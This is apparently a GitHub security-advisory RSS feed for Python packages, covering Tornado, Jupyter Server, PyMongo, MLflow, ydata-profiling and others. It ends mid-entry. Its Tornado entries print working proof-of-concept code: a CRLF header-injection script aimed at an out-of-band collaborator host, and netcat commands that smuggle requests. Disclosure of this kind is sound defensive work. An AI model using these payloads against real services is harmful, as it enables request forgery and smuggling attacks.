<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/pip.rss</id>
    <title>Security Advisory for Python packages hosted at PyPI.org</title>
    <updated>2024-06-06T22:01:11.529Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"/>
    <subtitle>Security Advisory for Python packages hosted at PyPI.org on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[tornado] Tornado has a CRLF injection in CurlAsyncHTTPClient headers]]></title>
        <id>https://github.com/advisories/GHSA-w235-7p84-xx57</id>
        <link href="https://github.com/advisories/GHSA-w235-7p84-xx57"/>
        <updated>2024-06-06T21:46:31.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Tornado’s <code>curl_httpclient.CurlAsyncHTTPClient</code> class is vulnerable to CRLF (carriage return/line feed) injection in the request headers.</p>
<h3 id="details">Details</h3>
<p>When an HTTP request is sent using <code>CurlAsyncHTTPClient</code>, Tornado does not reject carriage return (\r) or line feed (\n) characters in the request headers. As a result, if an application includes an attacker-controlled header value in a request sent using <code>CurlAsyncHTTPClient</code>, the attacker can inject arbitrary headers into the request or cause the application to send arbitrary requests to the specified server.</p>
<p>This behavior differs from that of the standard <code>AsyncHTTPClient</code> class, which does reject CRLF characters.</p>
<p>This issue appears to stem from libcurl's (as well as pycurl's) lack of validation for the <a href="https://curl.se/libcurl/c/CURLOPT_HTTPHEADER.html"><code>HTTPHEADER</code></a> option. libcurl’s documentation states:</p>
<blockquote>
<p>The headers included in the linked list must not be CRLF-terminated, because libcurl adds CRLF after each header item itself. Failure to comply with this might result in strange behavior. libcurl passes on the verbatim strings you give it, without any filter or other safe guards. That includes white space and control characters.</p>
</blockquote>
<p>pycurl similarly appears to assume that the headers adhere to the correct format. Therefore, without any validation on Tornado’s part, header names and values are included verbatim in the request sent by <code>CurlAsyncHTTPClient</code>, including any control characters that have special meaning in HTTP semantics.</p>
<h3 id="poc">PoC</h3>
<p>The issue can be reproduced using the following script:</p>
<pre><code class="language-python">import asyncio

from tornado import httpclient
from tornado import curl_httpclient

async def main():
    http_client = curl_httpclient.CurlAsyncHTTPClient()

    request = httpclient.HTTPRequest(
        # Burp Collaborator payload
        "http://727ymeu841qydmnwlol261ktkkqbe24qt.oastify.com/",
        method="POST",
        body="body",
        # Injected header using CRLF characters
        headers={"Foo": "Bar\r\nHeader: Injected"}
    )

    response = await http_client.fetch(request)
    print(response.body)

    http_client.close()

if __name__ == "__main__":
    asyncio.run(main())
</code></pre>
<p>When the specified server receives the request, it contains the injected header (<code>Header: Injected</code>) on its own line:</p>
<pre><code class="language-http">POST / HTTP/1.1
Host: 727ymeu841qydmnwlol261ktkkqbe24qt.oastify.com
User-Agent: Mozilla/5.0 (compatible; pycurl)
Accept: */*
Accept-Encoding: gzip,deflate
Foo: Bar
Header: Injected
Content-Length: 4
Content-Type: application/x-www-form-urlencoded

body
</code></pre>
<p>The attacker can also construct entirely new requests using a payload with multiple CRLF sequences. For example, specifying a header value of <code>\r\n\r\nPOST /attacker-controlled-url HTTP/1.1\r\nHost: 727ymeu841qydmnwlol261ktkkqbe24qt.oastify.com</code> results in the server receiving an additional, attacker-controlled request:</p>
<pre><code class="language-http">POST /attacker-controlled-url HTTP/1.1
Host: 727ymeu841qydmnwlol261ktkkqbe24qt.oastify.com
Content-Length: 4
Content-Type: application/x-www-form-urlencoded

body
</code></pre>
<h3 id="impact">Impact</h3>
<p>Applications using the Tornado library to send HTTP requests with untrusted header data are affected. This issue may facilitate the exploitation of server-side request forgery (SSRF) vulnerabilities.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/tornadoweb/tornado/security/advisories/GHSA-w235-7p84-xx57">https://github.com/tornadoweb/tornado/security/advisories/GHSA-w235-7p84-xx57</a></li>
<li><a href="https://github.com/tornadoweb/tornado/commit/7786f09f84c9f3f2012c4cf3878417cb9f053669">https://github.com/tornadoweb/tornado/commit/7786f09f84c9f3f2012c4cf3878417cb9f053669</a></li>
<li><a href="https://github.com/advisories/GHSA-w235-7p84-xx57">https://github.com/advisories/GHSA-w235-7p84-xx57</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-w235-7p84-xx57</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-06-06T21:46:31.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[tornado] Inconsistent Interpretation of HTTP Requests ('HTTP Request/Response Smuggling') in tornado]]></title>
        <id>https://github.com/advisories/GHSA-753j-mpmx-qq6g</id>
        <link href="https://github.com/advisories/GHSA-753j-mpmx-qq6g"/>
        <updated>2024-06-06T21:41:22.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>When Tornado receives a request with two <code>Transfer-Encoding: chunked</code> headers, it ignores them both. This enables request smuggling when Tornado is deployed behind a proxy server that emits such requests. <a href="https://en.wikipedia.org/wiki/Pound_(networking)">Pound</a> does this.</p>
<h3 id="poc">PoC</h3>
<ol start="0">
<li>Install Tornado.</li>
<li>Start a simple Tornado server that echoes each received request's body:</li>
</ol>
<pre><code class="language-bash">cat &lt;&lt; EOF &gt; server.py
import asyncio
import tornado

class MainHandler(tornado.web.RequestHandler):
    def post(self):
        self.write(self.request.body)

async def main():
    tornado.web.Application([(r"/", MainHandler)]).listen(8000)
    await asyncio.Event().wait()

asyncio.run(main())
EOF
python3 server.py &amp;
</code></pre>
<ol start="2">
<li>Send a valid chunked request:</li>
</ol>
<pre><code class="language-bash">printf 'POST / HTTP/1.1\r\nTransfer-Encoding: chunked\r\n\r\n1\r\nZ\r\n0\r\n\r\n' | nc localhost 8000
</code></pre>
<ol start="3">
<li>Observe that the response is as expected:</li>
</ol>
<pre><code>HTTP/1.1 200 OK
Server: TornadoServer/6.3.3
Content-Type: text/html; charset=UTF-8
Date: Sat, 07 Oct 2023 17:32:05 GMT
Content-Length: 1

Z
</code></pre>
<ol start="4">
<li>Send a request with two <code>Transfer-Encoding: chunked</code> headers:</li>
</ol>
<pre><code>printf 'POST / HTTP/1.1\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: chunked\r\n\r\n1\r\nZ\r\n0\r\n\r\n' | nc localhost 8000
</code></pre>
<ol start="5">
<li>Observe the strange response:</li>
</ol>
<pre><code>HTTP/1.1 200 OK
Server: TornadoServer/6.3.3
Content-Type: text/html; charset=UTF-8
Date: Sat, 07 Oct 2023 17:35:40 GMT
Content-Length: 0

HTTP/1.1 400 Bad Request
</code></pre>
<p>This is because Tornado believes that the request has no message body, so it tries to interpret <code>1\r\nZ\r\n0\r\n\r\n</code> as its own request, which causes a 400 response. With a little cleverness involving <code>chunk-ext</code>s, you can get Tornado to instead respond 405, which has the potential to desynchronize the connection, as opposed to 400 which should always result in a connection closure.</p>
<h3 id="impact">Impact</h3>
<p>Anyone using Tornado behind a proxy that forwards requests containing multiple <code>Transfer-Encoding: chunked</code> headers is vulnerable to request smuggling, which may entail ACL bypass, cache poisoning, or connection desynchronization.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/tornadoweb/tornado/security/advisories/GHSA-753j-mpmx-qq6g">https://github.com/tornadoweb/tornado/security/advisories/GHSA-753j-mpmx-qq6g</a></li>
<li><a href="https://github.com/tornadoweb/tornado/commit/d65f6e71a77f53a1ff0a0dc55704be13f04eb572">https://github.com/tornadoweb/tornado/commit/d65f6e71a77f53a1ff0a0dc55704be13f04eb572</a></li>
<li><a href="https://github.com/advisories/GHSA-753j-mpmx-qq6g">https://github.com/advisories/GHSA-753j-mpmx-qq6g</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-753j-mpmx-qq6g</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-06-06T21:41:20.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[jupyter_server] Jupyter server on Windows discloses Windows user password hash]]></title>
        <id>https://github.com/advisories/GHSA-hrw6-wg82-cm62</id>
        <link href="https://github.com/advisories/GHSA-hrw6-wg82-cm62"/>
        <updated>2024-06-06T21:26:55.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Jupyter Server on Windows has a vulnerability that lets unauthenticated attackers leak the NTLMv2 password hash of the Windows user running the Jupyter server. An attacker can crack this password to gain access to the Windows machine hosting the Jupyter server, or access other network-accessible machines or 3rd party services using that credential. Or an attacker perform an NTLM relay attack without cracking the credential to gain access to other network-accessible machines.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/jupyter-server/jupyter_server/security/advisories/GHSA-hrw6-wg82-cm62">https://github.com/jupyter-server/jupyter_server/security/advisories/GHSA-hrw6-wg82-cm62</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-35178">https://nvd.nist.gov/vuln/detail/CVE-2024-35178</a></li>
<li><a href="https://github.com/jupyter-server/jupyter_server/commit/79fbf801c5908f4d1d9bc90004b74cfaaeeed2df">https://github.com/jupyter-server/jupyter_server/commit/79fbf801c5908f4d1d9bc90004b74cfaaeeed2df</a></li>
<li><a href="https://github.com/advisories/GHSA-hrw6-wg82-cm62">https://github.com/advisories/GHSA-hrw6-wg82-cm62</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-hrw6-wg82-cm62</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-06-06T21:26:53.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[pymongo] PyMongo Out-of-bounds Read in the bson module ]]></title>
        <id>https://github.com/advisories/GHSA-m87m-mmvp-v9qm</id>
        <link href="https://github.com/advisories/GHSA-m87m-mmvp-v9qm"/>
        <updated>2024-06-05T17:11:00.000Z</updated>
        <content type="html"><![CDATA[<p>Versions of the package pymongo before 4.6.3 are vulnerable to Out-of-bounds Read in the bson module. Using the crafted payload the attacker could force the parser to deserialize unmanaged memory. The parser tries to interpret bytes next to buffer and throws an exception with string. If the following bytes are not printable UTF-8 the parser throws an exception with a single byte.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-5629">https://nvd.nist.gov/vuln/detail/CVE-2024-5629</a></li>
<li><a href="https://jira.mongodb.org/browse/PYTHON-4305">https://jira.mongodb.org/browse/PYTHON-4305</a></li>
<li><a href="https://github.com/mongodb/mongo-python-driver/commit/56b6b6dbc267d365d97c037082369dabf37405d2">https://github.com/mongodb/mongo-python-driver/commit/56b6b6dbc267d365d97c037082369dabf37405d2</a></li>
<li><a href="https://gist.github.com/keltecc/62a7c2bf74a997d0a7b48a0ff3853a03">https://gist.github.com/keltecc/62a7c2bf74a997d0a7b48a0ff3853a03</a></li>
<li><a href="https://security.snyk.io/vuln/SNYK-PYTHON-PYMONGO-6370597">https://security.snyk.io/vuln/SNYK-PYTHON-PYMONGO-6370597</a></li>
<li><a href="https://github.com/advisories/GHSA-m87m-mmvp-v9qm">https://github.com/advisories/GHSA-m87m-mmvp-v9qm</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-m87m-mmvp-v9qm</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-06-05T15:30:39.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[pypqc] Observable Timing Discrepancy in pypqc]]></title>
        <id>https://github.com/advisories/GHSA-hvh4-5qr6-3v7r</id>
        <link href="https://github.com/advisories/GHSA-hvh4-5qr6-3v7r"/>
        <updated>2024-06-05T18:36:16.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p><code>kyber512</code>, <code>kyber768</code>, and <code>kyber1024</code> on Mac OS (or when compiled with clang) only: An attacker able to submit many decapsulation requests against a single private key, and to gain timing information about the decapsulation, could recover the private key. Proof-of-concept exploit exists for a local attacker.</p>
<p>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N/E:P/RL:U/RC:C  </p>
<h3 id="patches">Patches</h3>
<p>No patch is currently available / pending upstream <a href="https://github.com/PQClean/PQClean/issues/556">PQClean#556</a>.</p>
<h3 id="workarounds">Workarounds</h3>
<p>No workarounds have been reported. The 0.0.7 -&gt; 0.0.7.1 upgrade, when available, should be a drop-in replacement.</p>
<h3 id="references">References</h3>
<p><a href="https://pqshield.com/pqshield-plugs-timing-leaks-in-kyber-ml-kem-to-improve-pqc-implementation-maturity/">https://pqshield.com/pqshield-plugs-timing-leaks-in-kyber-ml-kem-to-improve-pqc-implementation-maturity/</a></p>
<p><a href="https://github.com/antoonpurnal/clangover">https://github.com/antoonpurnal/clangover</a></p>
<p><a href="https://www.github.com/PQClean/PQClean/issues/556">https://www.github.com/PQClean/PQClean/issues/556</a></p>
<p><a href="https://www.github.com/pq-crystals/kyber/commit/9b8d30698a3e7449aeb34e62339d4176f11e3c6c">https://www.github.com/pq-crystals/kyber/commit/9b8d30698a3e7449aeb34e62339d4176f11e3c6c</a></p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/JamesTheAwesomeDude/pypqc/security/advisories/GHSA-hvh4-5qr6-3v7r">https://github.com/JamesTheAwesomeDude/pypqc/security/advisories/GHSA-hvh4-5qr6-3v7r</a></li>
<li><a href="https://github.com/PQClean/PQClean/issues/556">https://github.com/PQClean/PQClean/issues/556</a></li>
<li><a href="https://github.com/advisories/GHSA-hvh4-5qr6-3v7r">https://github.com/advisories/GHSA-hvh4-5qr6-3v7r</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-hvh4-5qr6-3v7r</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-06-05T16:56:35.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[gradio_pdf] Arbitrary JavaScript execution due to using outdated libraries]]></title>
        <id>https://github.com/advisories/GHSA-4m3g-6r7g-jv4f</id>
        <link href="https://github.com/advisories/GHSA-4m3g-6r7g-jv4f"/>
        <updated>2024-06-05T14:15:51.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>gradio-pdf projects with dependencies on the pdf.js library are vulnerable to CVE-2024-4367, which allows arbitrary JavaScript execution.</p>
<h3 id="poc">PoC</h3>
<ol>
<li><p>Generate a pdf file with a malicious script in the fontmatrix. (This will run <code>alert(‘XSS’)</code>.)
<a href="https://github.com/user-attachments/files/15516798/poc.pdf">poc.pdf</a></p>
</li>
<li><p>Run the app. In this PoC, I've used the demo for a simple proof.
<img alt="1" src="https://github.com/freddyaboulton/gradio-pdf/assets/114328108/d1bb7626-3d0f-4984-8873-297658d6e77e"></p>
</li>
<li><p>Upload a PDF file containing the script.
<img alt="2" src="https://github.com/freddyaboulton/gradio-pdf/assets/114328108/803d8080-c946-446e-bb34-cf5640e1b4de"></p>
</li>
<li><p>Check that the script is running.
<img alt="3" src="https://github.com/freddyaboulton/gradio-pdf/assets/114328108/4956b95f-acca-4bb1-a3c2-7dfc96adf890"></p>
</li>
</ol>
<h3 id="impact">Impact</h3>
<p>Malicious scripts can be injected into the code, and when linked with vulnerabilities such as CSRF, it can cause even greater damage. In particular, It can become a source of further attacks, especially when linked to social engineering.</p>
<h3 id="mitigation">Mitigation</h3>
<p>Upgrade the pdf.js to v4.2.67, which removes the vulnerability. (or set the option <code>isEvalSupported</code> to <code>false</code>.)</p>
<h3 id="reference">Reference</h3>
<ol>
<li><a href="https://codeanlabs.com/blog/research/cve-2024-4367-arbitrary-js-execution-in-pdf-js/">https://codeanlabs.com/blog/research/cve-2024-4367-arbitrary-js-execution-in-pdf-js/</a></li>
<li><a href="https://github.com/mozilla/pdf.js/pull/18015">https://github.com/mozilla/pdf.js/pull/18015</a></li>
</ol>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/freddyaboulton/gradio-pdf/security/advisories/GHSA-4m3g-6r7g-jv4f">https://github.com/freddyaboulton/gradio-pdf/security/advisories/GHSA-4m3g-6r7g-jv4f</a></li>
<li><a href="https://github.com/freddyaboulton/gradio-pdf/commit/67edd0c625fae7b855186727ee9678297602ee45">https://github.com/freddyaboulton/gradio-pdf/commit/67edd0c625fae7b855186727ee9678297602ee45</a></li>
<li><a href="https://github.com/advisories/GHSA-4m3g-6r7g-jv4f">https://github.com/advisories/GHSA-4m3g-6r7g-jv4f</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-4m3g-6r7g-jv4f</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2024-06-05T14:15:50.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[skops] Skops unsafe deserialization]]></title>
        <id>https://github.com/advisories/GHSA-q49c-6v6g-wgq3</id>
        <link href="https://github.com/advisories/GHSA-q49c-6v6g-wgq3"/>
        <updated>2024-06-05T13:27:17.000Z</updated>
        <content type="html"><![CDATA[<p>Deserialization of untrusted data can occur in versions 0.6 or newer of the skops python library, enabling a maliciously crafted model to run arbitrary code on an end user's system when loaded.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-37065">https://nvd.nist.gov/vuln/detail/CVE-2024-37065</a></li>
<li><a href="https://hiddenlayer.com/sai-security-advisory/skops-june2024">https://hiddenlayer.com/sai-security-advisory/skops-june2024</a></li>
<li><a href="https://github.com/advisories/GHSA-q49c-6v6g-wgq3">https://github.com/advisories/GHSA-q49c-6v6g-wgq3</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-q49c-6v6g-wgq3</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-06-04T12:31:06.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[ydata-profiling] ydata cross-site scripting]]></title>
        <id>https://github.com/advisories/GHSA-2r57-2mrh-ggjv</id>
        <link href="https://github.com/advisories/GHSA-2r57-2mrh-ggjv"/>
        <updated>2024-06-05T13:26:58.000Z</updated>
        <content type="html"><![CDATA[<p>A cross-site scripting (XSS) vulnerability in versions 3.7.0 or newer of Ydata's ydata-profiling open-source library allows for payloads to be run when a maliocusly crafted report is viewed in the browser.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-37063">https://nvd.nist.gov/vuln/detail/CVE-2024-37063</a></li>
<li><a href="https://hiddenlayer.com/sai-security-advisory/ydata-june2024">https://hiddenlayer.com/sai-security-advisory/ydata-june2024</a></li>
<li><a href="https://github.com/advisories/GHSA-2r57-2mrh-ggjv">https://github.com/advisories/GHSA-2r57-2mrh-ggjv</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-2r57-2mrh-ggjv</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-06-04T12:31:05.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[ydata-profiling] ydata unsafe deserialization]]></title>
        <id>https://github.com/advisories/GHSA-cg49-hrj4-3rpr</id>
        <link href="https://github.com/advisories/GHSA-cg49-hrj4-3rpr"/>
        <updated>2024-06-05T13:26:29.000Z</updated>
        <content type="html"><![CDATA[<p>Deseriliazation of untrusted data can occur in versions 3.7.0 or newer of Ydata's ydata-profiling open-source library, enabling a maliciously crafted dataset to run arbitrary code on an end user's system when loaded.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-37064">https://nvd.nist.gov/vuln/detail/CVE-2024-37064</a></li>
<li><a href="https://hiddenlayer.com/sai-security-advisory/ydata-june2024">https://hiddenlayer.com/sai-security-advisory/ydata-june2024</a></li>
<li><a href="https://github.com/advisories/GHSA-cg49-hrj4-3rpr">https://github.com/advisories/GHSA-cg49-hrj4-3rpr</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-cg49-hrj4-3rpr</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-06-04T12:31:05.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[ydata-profiling] ydata unsafe deserialization]]></title>
        <id>https://github.com/advisories/GHSA-fpvj-m2h6-6wc5</id>
        <link href="https://github.com/advisories/GHSA-fpvj-m2h6-6wc5"/>
        <updated>2024-06-05T13:25:57.000Z</updated>
        <content type="html"><![CDATA[<p>Deserialization of untrusted data can occur in versions 3.7.0 or newer of Ydata's ydata-profiling open-source library, enabling a malicously crafted report to run arbitrary code on an end user's system when loaded.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-37062">https://nvd.nist.gov/vuln/detail/CVE-2024-37062</a></li>
<li><a href="https://hiddenlayer.com/sai-security-advisory/ydata-june2024">https://hiddenlayer.com/sai-security-advisory/ydata-june2024</a></li>
<li><a href="https://github.com/advisories/GHSA-fpvj-m2h6-6wc5">https://github.com/advisories/GHSA-fpvj-m2h6-6wc5</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-fpvj-m2h6-6wc5</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-06-04T12:31:05.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[mlflow] MLFlow improper input validation]]></title>
        <id>https://github.com/advisories/GHSA-pqcv-qw2r-r859</id>
        <link href="https://github.com/advisories/GHSA-pqcv-qw2r-r859"/>
        <updated>2024-06-05T13:25:36.000Z</updated>
        <content type="html"><![CDATA[<p>Remote Code Execution can occur in versions of the MLflow platform running version 1.11.0 or newer, enabling a maliciously crafted MLproject to execute arbitrary code on an end user’s system when run due to unfiltered input.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-37061">https://nvd.nist.gov/vuln/detail/CVE-2024-37061</a></li>
<li><a href="https://hiddenlayer.com/sai-security-advisory/mlflow-june2024">https://hiddenlayer.com/sai-security-advisory/mlflow-june2024</a></li>
<li><a href="https://github.com/advisories/GHSA-pqcv-qw2r-r859">https://github.com/advisories/GHSA-pqcv-qw2r-r859</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-pqcv-qw2r-r859</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-06-04T12:31:05.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[mlflow] MLFlow unsafe deserialization]]></title>
        <id>https://github.com/advisories/GHSA-cv6c-7963-wxcg</id>
        <link href="https://github.com/advisories/GHSA-cv6c-7963-wxcg"/>
        <updated>2024-06-05T13:22:41.000Z</updated>
        <content type="html"><![CDATA[<p>Deserialization of untrusted data can occur in versions of the MLflow platform running version 1.27.0 or newer, enabling a maliciously crafted Recipe to execute arbitrary code on an end user’s system when run.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-37060">https://nvd.nist.gov/vuln/detail/CVE-2024-37060</a></li>
<li><a href="https://hiddenlayer.com/sai-security-advisory/mlflow-june2024">https://hiddenlayer.com/sai-security-advisory/mlflow-june2024</a></li>
<li><a href="https://github.com/advisories/GHSA-cv6c-7963-wxcg">https://github.com/advisories/GHSA-cv6c-7963-wxcg</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-cv6c-7963-wxcg</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-06-04T12:31:05.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[mlflow] MLFlow unsafe deserialization]]></title>
        <id>https://github.com/advisories/GHSA-wf7f-8fxf-xfxc</id>
        <link href="https://github.com/advisories/GHSA-wf7f-8fxf-xfxc"/>
        <updated>2024-06-05T13:21:56.000Z</updated>
        <content type="html"><![CDATA[<p>Deserialization of untrusted data can occur in versions of the MLflow platform running version 0.5.0 or newer, enabling a maliciously uploaded PyTorch model to run arbitrary code on an end user’s system when interacted with.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-37059">https://nvd.nist.gov/vuln/detail/CVE-2024-37059</a></li>
<li><a href="https://hiddenlayer.com/sai-security-advisory/mlflow-june2024">https://hiddenlayer.com/sai-security-advisory/mlflow-june2024</a></li>
<li><a href="https://github.com/advisories/GHSA-wf7f-8fxf-xfxc">https://github.com/advisories/GHSA-wf7f-8fxf-xfxc</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-wf7f-8fxf-xfxc</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-06-04T12:31:05.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[mlflow] MLFlow unsafe deserialization]]></title>
        <id>https://github.com/advisories/GHSA-cwgg-w6mp-w9hg</id>
        <link href="https://github.com/advisories/GHSA-cwgg-w6mp-w9hg"/>
        <updated>2024-06-05T13:21:40.000Z</updated>
        <content type="html"><![CDATA[<p>Deserialization of untrusted data can occur in versions of the MLflow platform running version 2.5.0 or newer, enabling a maliciously uploaded Langchain AgentExecutor model to run arbitrary code on an end user’s system when interacted with.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-37058">https://nvd.nist.gov/vuln/detail/CVE-2024-37058</a></li>
<li><a href="https://hiddenlayer.com/sai-security-advisory/mlflow-june2024">https://hiddenlayer.com/sai-security-advisory/mlflow-june2024</a></li>
<li><a href="https://github.com/advisories/GHSA-cwgg-w6mp-w9hg">https://github.com/advisories/GHSA-cwgg-w6mp-w9hg</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-cwgg-w6mp-w9hg</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-06-04T12:31:05.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[mlflow] MLFlow unsafe deserialization]]></title>
        <id>https://github.com/advisories/GHSA-j8mg-pqc5-x9gj</id>
        <link href="https://github.com/advisories/GHSA-j8mg-pqc5-x9gj"/>
        <updated>2024-06-05T13:18:40.000Z</updated>
        <content type="html"><![CDATA[<p>Deserialization of untrusted data can occur in versions of the MLflow platform running version 2.0.0rc0 or newer, enabling a maliciously uploaded Tensorflow model to run arbitrary code on an end user’s system when interacted with.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-37057">https://nvd.nist.gov/vuln/detail/CVE-2024-37057</a></li>
<li><a href="https://hiddenlayer.com/sai-security-advisory/mlflow-june2024">https://hiddenlayer.com/sai-security-advisory/mlflow-june2024</a></li>
<li><a href="https://github.com/advisories/GHSA-j8mg-pqc5-x9gj">https://github.com/advisories/GHSA-j8mg-pqc5-x9gj</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-j8mg-pqc5-x9gj</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-06-04T12:31:05.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[mlflow] MLFlow unsafe deserialization]]></title>
        <id>https://github.com/advisories/GHSA-76cg-cfhx-373f</id>
        <link href="https://github.com/advisories/GHSA-76cg-cfhx-373f"/>
        <updated>2024-06-05T13:18:30.000Z</updated>
        <content type="html"><![CDATA[<p>Deserialization of untrusted data can occur in versions of the MLflow platform running version 1.1.0 or newer, enabling a maliciously uploaded scikit-learn model to run arbitrary code on an end user’s system when interacted with.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-37052">https://nvd.nist.gov/vuln/detail/CVE-2024-37052</a></li>
<li><a href="https://hiddenlayer.com/sai-security-advisory/mlflow-june2024">https://hiddenlayer.com/sai-security-advisory/mlflow-june2024</a></li>
<li><a href="https://github.com/advisories/GHSA-76cg-cfhx-373f">https://github.com/advisories/GHSA-76cg-cfhx-373f</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-76cg-cfhx-373f</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-06-04T12:31:04.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[mlflow] MLFlow unsafe deserialization]]></title>
        <id>https://github.com/advisories/GHSA-7p8j-qv6x-f4g4</id>
        <link href="https://github.com/advisories/GHSA-7p8j-qv6x-f4g4"/>
        <updated>2024-06-05T13:18:19.000Z</updated>
        <content type="html"><![CDATA[<p>Deserialization of untrusted data can occur in versions of the MLflow platform running version 1.23.0 or newer, enabling a maliciously uploaded LightGBM scikit-learn model to run arbitrary code on an end user’s system when interacted with.</p>
<h3 id="references">References</h3>
<ul>
